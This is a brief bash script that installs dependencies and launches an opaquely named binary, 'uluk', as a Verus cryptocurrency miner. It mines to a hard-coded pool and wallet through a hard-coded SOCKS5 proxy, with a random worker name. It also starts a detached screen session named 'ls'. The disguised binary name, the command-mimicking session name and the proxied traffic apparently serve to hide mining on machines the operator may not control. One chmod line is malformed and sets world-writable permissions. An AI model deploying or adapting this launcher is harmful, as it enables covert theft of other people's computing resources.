#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://ru.rplant.xyz:7042
WALLET=sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg
WORKER=$(echo $(shuf -i 1-10 -n 1)P)
PROXY=socks5://89.248.118.218:1080
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
